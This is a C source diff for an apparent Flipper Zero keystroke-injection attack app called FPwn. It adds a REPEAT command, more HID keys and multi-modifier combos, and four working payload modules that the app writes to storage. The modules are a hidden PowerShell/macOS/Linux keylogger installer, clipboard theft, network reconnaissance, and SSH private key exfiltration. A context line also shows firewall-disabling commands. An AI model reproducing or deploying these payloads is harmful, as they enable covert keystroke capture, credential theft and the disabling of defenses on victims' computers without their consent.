@@ -26,6 +26,9 @@
 
 #define TAG "FPwn"
 
+/* Persists the most-recently executed non-REPEAT command for REPEAT <n> */
+static char s_last_command[FPWN_MAX_LINE_LEN];
+
 /* =========================================================================
  * Internal helpers
  * ========================================================================= */
@@ -340,6 +343,11 @@ static uint16_t fpwn_named_key(const char* name) {
     if(strcmp(name, "F10") == 0) return HID_KEYBOARD_F10;
     if(strcmp(name, "F11") == 0) return HID_KEYBOARD_F11;
     if(strcmp(name, "F12") == 0) return HID_KEYBOARD_F12;
+    /* Extended keys */
+    if(strcmp(name, "MENU") == 0 || strcmp(name, "APP") == 0) return HID_KEYBOARD_APPLICATION;
+    if(strcmp(name, "PRINTSCREEN") == 0) return HID_KEYBOARD_PRINT_SCREEN;
+    if(strcmp(name, "INSERT") == 0) return HID_KEYBOARD_INSERT;
+    if(strcmp(name, "PAUSE") == 0) return HID_KEYBOARD_PAUSE;
     return 0;
 }
 
@@ -411,8 +419,27 @@ static void
  * `app` is required for WiFi commands; all non-WiFi commands ignore it.
  */
 static void fpwn_exec_command(const char* line, FPwnApp* app) {
-    /* Skip empty lines and comments */
+    /* Skip empty lines and comments (# and REM) */
     if(line[0] == '\0' || line[0] == '#') return;
+    if(strncmp(line, "REM ", 4) == 0 || strcmp(line, "REM") == 0) return;
+
+    /* Track last command for REPEAT (must happen before any early return) */
+    if(strncmp(line, "REPEAT ", 7) != 0) {
+        strncpy(s_last_command, line, FPWN_MAX_LINE_LEN - 1);
+        s_last_command[FPWN_MAX_LINE_LEN - 1] = '\0';
+    }
+
+    /* ---- REPEAT <n> ---- */
+    if(strncmp(line, "REPEAT ", 7) == 0) {
+        int n = atoi(line + 7);
+        /* Guard: s_last_command must not itself be a REPEAT to avoid recursion */
+        if(n > 0 && s_last_command[0] != '\0' && strncmp(s_last_command, "REPEAT ", 7) != 0) {
+            for(int i = 0; i < n; i++) {
+                fpwn_exec_command(s_last_command, app);
+            }
+        }
+        return;
+    }
 
     /* ---- DELAY ---- */
     if(strncmp(line, "DELAY ", 6) == 0) {
@@ -494,7 +521,104 @@ static void fpwn_exec_command(const char* line, FPwnApp* app) {
         return;
     }
 
+    /* ---- Lock keys (standalone) ---- */
+    if(strcmp(line, "CAPSLOCK") == 0) {
+        furi_hal_hid_kb_press(HID_KEYBOARD_CAPS_LOCK);
+        furi_delay_ms(2);
+        furi_hal_hid_kb_release(HID_KEYBOARD_CAPS_LOCK);
+        return;
+    }
+    if(strcmp(line, "NUMLOCK") == 0) {
+        furi_hal_hid_kb_press(HID_KEYPAD_NUMLOCK);
+        furi_delay_ms(2);
+        furi_hal_hid_kb_release(HID_KEYPAD_NUMLOCK);
+        return;
+    }
+    if(strcmp(line, "SCROLLLOCK") == 0) {
+        furi_hal_hid_kb_press(HID_KEYBOARD_SCROLL_LOCK);
+        furi_delay_ms(2);
+        furi_hal_hid_kb_release(HID_KEYBOARD_SCROLL_LOCK);
+        return;
+    }
+
+    /* ---- Additional standalone keys ---- */
+    if(strcmp(line, "MENU") == 0 || strcmp(line, "APP") == 0) {
+        furi_hal_hid_kb_press(HID_KEYBOARD_APPLICATION);
+        furi_delay_ms(2);
+        furi_hal_hid_kb_release(HID_KEYBOARD_APPLICATION);
+        return;
+    }
+    if(strcmp(line, "PRINTSCREEN") == 0) {
+        furi_hal_hid_kb_press(HID_KEYBOARD_PRINT_SCREEN);
+        furi_delay_ms(2);
+        furi_hal_hid_kb_release(HID_KEYBOARD_PRINT_SCREEN);
+        return;
+    }
+    if(strcmp(line, "INSERT") == 0) {
+        furi_hal_hid_kb_press(HID_KEYBOARD_INSERT);
+        furi_delay_ms(2);
+        furi_hal_hid_kb_release(HID_KEYBOARD_INSERT);
+        return;
+    }
+    if(strcmp(line, "PAUSE") == 0) {
+        furi_hal_hid_kb_press(HID_KEYBOARD_PAUSE);
+        furi_delay_ms(2);
+        furi_hal_hid_kb_release(HID_KEYBOARD_PAUSE);
+        return;
+    }
+
+    /* ---- LED — flash green notification LED ---- */
+    if(strcmp(line, "LED") == 0) {
+        notification_message(app->notifications, &sequence_blink_green_100);
+        return;
+    }
+
     /* ---- Modifier combos ---- */
+
+    /* CTRL ALT SHIFT <key> — three-modifier combo; check before two-mod variants */
+    if(strncmp(line, "CTRL ALT SHIFT ", 15) == 0) {
+        uint16_t kc = fpwn_named_key(line + 15);
+        if(kc) {
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | KEY_MOD_LEFT_SHIFT | kc);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(
+                KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_ALT | KEY_MOD_LEFT_SHIFT | kc);
+        }
+        return;
+    }
+
+    /* CTRL SHIFT <key> — must check before lone CTRL */
+    if(strncmp(line, "CTRL SHIFT ", 11) == 0) {
+        uint16_t kc = fpwn_named_key(line + 11);
+        if(kc) {
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_SHIFT | kc);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_SHIFT | kc);
+        }
+        return;
+    }
+
+    /* ALT SHIFT <key> — must check before lone ALT/SHIFT */
+    if(strncmp(line, "ALT SHIFT ", 10) == 0) {
+        uint16_t kc = fpwn_named_key(line + 10);
+        if(kc) {
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_ALT | KEY_MOD_LEFT_SHIFT | kc);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_ALT | KEY_MOD_LEFT_SHIFT | kc);
+        }
+        return;
+    }
+
+    /* CTRL GUI <key> — must check before lone CTRL/GUI */
+    if(strncmp(line, "CTRL GUI ", 9) == 0) {
+        uint16_t kc = fpwn_named_key(line + 9);
+        if(kc) {
+            furi_hal_hid_kb_press(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_GUI | kc);
+            furi_delay_ms(30);
+            furi_hal_hid_kb_release(KEY_MOD_LEFT_CTRL | KEY_MOD_LEFT_GUI | kc);
+        }
+        return;
+    }
 
     /* CTRL ALT <key> — must check before lone CTRL/ALT */
     if(strncmp(line, "CTRL ALT ", 9) == 0) {
@@ -1647,6 +1771,127 @@ static const char SAMPLE_DISABLE_DEFENDER[] =
     "STRING sudo systemctl stop firewalld 2>/dev/null; sudo ufw disable 2>/dev/null; sudo iptables -F 2>/dev/null; echo Defenses disabled\n"
     "ENTER\n";
 
+/* Keylogger Install — captures keystrokes to a file using platform-native methods */
+static const char SAMPLE_KEYLOGGER[] =
+    "NAME Keylogger Install\n"
+    "DESCRIPTION Installs a lightweight keylogger that captures keystrokes to a file\n"
+    "CATEGORY post\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION LHOST 192.168.1.100 \"Attacker IP (your machine)\"\n"
+    "OPTION DURATION 60 \"Capture duration in seconds\"\n"
+    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING powershell -nop -ep bypass -w hidden\n"
+    "ENTER\n"
+    "DELAY 1200\n"
+    "STRING $o=\"$env:TEMP\\kl.txt\";$d={{DURATION}};$e=(Get-Date).AddSeconds($d);$s=@{};Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class KL{[DllImport(\"user32.dll\")]public static extern short GetAsyncKeyState(int k);}';while((Get-Date)-lt $e){for($i=8;$i -le 190;$i++){if([KL]::GetAsyncKeyState($i) -band 1){Add-Content $o ([char]$i)}};Start-Sleep -ms 50};Write-Host \"Keylog saved to $o\"\n"
+    "ENTER\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "STRING script -q /tmp/.kl sh -c 'sleep {{DURATION}}' && strings /tmp/.kl > /tmp/.kl2 && mv /tmp/.kl2 /tmp/.kl && echo \"Keylog saved to /tmp/.kl\"\n"
+    "ENTER\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "STRING KID=$(xinput list 2>/dev/null | grep -i keyboard | grep -oP 'id=\\K[0-9]+' | head -1); if [ -n \"$KID\" ]; then timeout {{DURATION}} xinput test $KID > /tmp/.kl 2>/dev/null & echo \"Keylog capturing to /tmp/.kl (PID $!)\"; else sudo timeout {{DURATION}} cat /dev/input/event0 | xxd > /tmp/.kl 2>/dev/null & echo \"Keylog capturing to /tmp/.kl\"; fi\n"
+    "ENTER\n";
+
+/* Clipboard Dump — exfiltrates clipboard contents via LED channel */
+static const char SAMPLE_CLIPBOARD_STEAL[] =
+    "NAME Clipboard Dump\n"
+    "DESCRIPTION Exfiltrates clipboard contents via LED channel\n"
+    "CATEGORY credential\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING powershell -nop -ep bypass\n"
+    "ENTER\n"
+    "DELAY 1200\n"
+    "EXFIL Get-Clipboard\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "EXFIL pbpaste\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "EXFIL xclip -selection clipboard -o 2>/dev/null || xsel --clipboard --output 2>/dev/null\n";
+
+/* Network Recon — dumps ARP table, routing table, DNS config, and active connections */
+static const char SAMPLE_NETWORK_RECON[] =
+    "NAME Network Recon\n"
+    "DESCRIPTION Dumps ARP table, routing table, DNS config, and active connections\n"
+    "CATEGORY recon\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING powershell -nop -ep bypass\n"
+    "ENTER\n"
+    "DELAY 1200\n"
+    "EXFIL echo '=== ARP ===' ; arp -a ; echo '=== ROUTE ===' ; route print ; echo '=== DNS ===' ; ipconfig /displaydns | Select-String 'Record Name' | Select -First 20 ; echo '=== CONNECTIONS ===' ; netstat -an | Select-Object -First 30\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "EXFIL echo '=== ARP ===' && arp -a && echo '=== ROUTE ===' && netstat -rn && echo '=== CONNECTIONS ===' && netstat -an | head -30\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "EXFIL echo '=== ARP ===' && arp -a && echo '=== ROUTE ===' && ip route && echo '=== DNS ===' && cat /etc/resolv.conf && echo '=== CONNECTIONS ===' && ss -tuln | head -30\n";
+
+/* SSH Key Dump — exfiltrates SSH private keys from the target */
+static const char SAMPLE_SSH_KEY_THEFT[] =
+    "NAME SSH Key Dump\n"
+    "DESCRIPTION Exfiltrates SSH private keys from the target\n"
+    "CATEGORY credential\n"
+    "PLATFORMS WIN,MAC,LINUX\n"
+    "OPTION DELAY 2000 \"Initial HID enumeration delay (ms)\"\n"
+    "PLATFORM WIN\n"
+    "DELAY {{DELAY}}\n"
+    "GUI r\n"
+    "DELAY 800\n"
+    "STRING powershell -nop -ep bypass\n"
+    "ENTER\n"
+    "DELAY 1200\n"
+    "EXFIL if(Test-Path $env:USERPROFILE\\.ssh\\id_rsa){Get-Content $env:USERPROFILE\\.ssh\\id_rsa}elseif(Test-Path $env:USERPROFILE\\.ssh\\id_ed25519){Get-Content $env:USERPROFILE\\.ssh\\id_ed25519}else{Write-Output 'No SSH keys found'}\n"
+    "PLATFORM MAC\n"
+    "DELAY {{DELAY}}\n"
+    "GUI SPACE\n"
+    "DELAY 700\n"
+    "STRING Terminal\n"
+    "ENTER\n"
+    "DELAY 1400\n"
+    "EXFIL cat ~/.ssh/id_rsa 2>/dev/null || cat ~/.ssh/id_ed25519 2>/dev/null || echo 'No SSH keys found'\n"
+    "PLATFORM LINUX\n"
+    "DELAY {{DELAY}}\n"
+    "CTRL ALT t\n"
+    "DELAY 1400\n"
+    "EXFIL cat ~/.ssh/id_rsa 2>/dev/null || cat ~/.ssh/id_ed25519 2>/dev/null || echo 'No SSH keys found'\n";
+
 static bool fpwn_write_sample_file(Storage* storage, const char* path, const char* content) {
     File* f = storage_file_alloc(storage);
     if(!storage_file_open(f, path, FSAM_WRITE, FSOM_CREATE_NEW)) {
@@ -1693,4 +1938,16 @@ void fpwn_modules_write_samples(FPwnApp* app) {
 
     snprintf(path, sizeof(path), "%s/disable_defender.fpwn", FPWN_MODULES_DIR);
     fpwn_write_sample_file(app->storage, path, SAMPLE_DISABLE_DEFENDER);
+
+    snprintf(path, sizeof(path), "%s/keylogger.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_KEYLOGGER);
+
+    snprintf(path, sizeof(path), "%s/clipboard_steal.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_CLIPBOARD_STEAL);
+
+    snprintf(path, sizeof(path), "%s/network_recon.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_NETWORK_RECON);
+
+    snprintf(path, sizeof(path), "%s/ssh_key_theft.fpwn", FPWN_MODULES_DIR);
+    fpwn_write_sample_file(app->storage, path, SAMPLE_SSH_KEY_THEFT);
 }
